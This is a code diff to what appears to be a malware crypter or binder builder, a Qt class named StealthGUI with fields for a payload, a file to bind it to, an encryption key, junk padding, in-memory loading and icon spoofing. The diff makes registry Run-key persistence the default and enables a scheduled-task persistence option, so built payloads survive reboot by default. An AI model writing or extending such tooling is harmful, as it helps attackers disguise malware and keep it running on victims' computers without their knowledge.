@@ -381,11 +381,10 @@ class StealthGUI(QMainWindow):
         self.persistence_combo.addItems([
             "None",
             "Startup Folder",
-            "Registry Run Key",
-            "Scheduled Task (Disabled)",
-            "Fileless (Disabled)"
+            "Registry Run Key (Preferred)",
+            "Scheduled Task"
         ])
-        self.persistence_combo.setCurrentText("None")
+        self.persistence_combo.setCurrentText("Registry Run Key (Preferred)")
         persistence_combo_layout.addWidget(persistence_label)
         persistence_combo_layout.addWidget(self.persistence_combo)
         persistence_layout.addLayout(persistence_combo_layout)
@@ -612,6 +611,7 @@ class StealthGUI(QMainWindow):
             return
 
         if not os.path.exists("rcedit-x64.exe"):
+            pass
             QMessageBox.warning(self, "Warning", "rcedit-x64.exe not found. Icon setting may fail if binding is not used.")
 
         icon_path = self.icon_input.text()
@@ -626,10 +626,7 @@ class StealthGUI(QMainWindow):
 
         key = self.key_input.text()
         junk_size_mb = self.junk_combo.currentText()
-        persistence_method = self.persistence_combo.currentText()
-        persistence_flag = "0"
-        if persistence_method == "Startup Folder":
-            persistence_flag = "1"
+        persistence_flag = str(self.persistence_combo.currentIndex()) # Direct index as number
         load_in_memory = "1" if self.load_in_memory_check.isChecked() else "0"
         payload_file_name = self.payload_file_name_input.text()
         binded_file_name = self.binded_file_name_input.text()
